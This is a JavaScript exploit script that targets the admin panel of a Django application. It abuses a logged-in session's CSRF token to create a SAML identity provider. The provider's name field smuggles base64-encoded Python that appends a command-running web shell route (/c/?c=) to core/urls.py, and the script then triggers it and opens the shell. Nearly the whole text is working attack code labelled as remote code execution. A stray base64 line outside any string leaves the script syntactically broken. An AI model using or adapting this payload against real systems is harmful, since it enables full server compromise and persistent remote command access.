 (function() {
     function getCookie(n){let b=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)');return b?b.pop():''}
     const id = Math.floor(Math.random() * 999);
     const slug = 'win-' + id;

     // Optimized Base64 payload (Fits under 255 chars)
 CmY9b3BlbignY29yZS91cmxzLnB5JywnYScpCmYud3JpdGUoIiIiCmZyb20gZGphbmdvLmh0dHAgaW1wb3J0IEh0dHBSZXNwb25zZQpkZWYgcyhyKToKICAgIGltcG9ydCBvcwogICAgcmV0dXJuIEh0dHBSZXNwb25zZShvcy5wb3BlbihyLkdFVC5nZXQoImMiKSkucmVhZCgpKQogICAgdXJscGF0dGVybnMrPVtwYXRoKCJjLyIscyldCiAgICAiIiIpO2YuY2xvc2UoKQo=

     const b64 = "Zj1vcGVuKCdjb3JlL3VybHMucHknLCdhJyk7Zi53cml0ZSgnXG5mcm9tIGRqYW5nby5odHRwIGltcG9ydCBIdHRwUmVzcG9uc2VcbmRlZiBzKHIpOmltcG9ydCBvcztyZXR1cm4gSHR0cFJlc3BvbnNlKG9zLnBvcGVuKHIuR0VULmdldCgiYyIpKS5yZWFkKCkpXG51cmxwYXR0ZXJucys9W3BhdGgoImMvIixzKV0nKTtmLmNsb3NlKCk=";

     const name = `Win${id}\nimport base64;exec(base64.b64decode("${b64}"))`;

     const formData = new FormData();
     formData.append('csrfmiddlewaretoken', getCookie('csrftoken'));
     formData.append('name', name);
     formData.append('slug', slug);
     formData.append('protocol', 'saml');
     formData.append('status', 'active');
     formData.append('priority', '0');
     formData.append('use_custom_attribute_map', 'on');
     formData.append('attribute_mapping', '{"email":["mail"]}');
     formData.append('saml_metadata_xml', `<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
 protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
 Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>`);
     formData.append('_save', 'Save');

     console.log("Creating IDP (Length: " + name.length + ")...");
     fetch('/admin/uac/identityprovider/add/', { method: 'POST', body: formData })
     .then(r => r.text())
     .then(html => {
         if (html.includes('errorlist')) {
             console.error("Validation failed! Check response for details.");
         } else {
             console.log("IDP Created. Triggering RCE...");
             fetch('/saml2/login/' + slug + '/').then(() => {
                 console.log("RCE Sent. Web shell will be ready in 5s at /c/?c=id");
                 setTimeout(() => { window.open('/c/?c=id', '_blank'); }, 5000);
             });
         }
     });
 })();
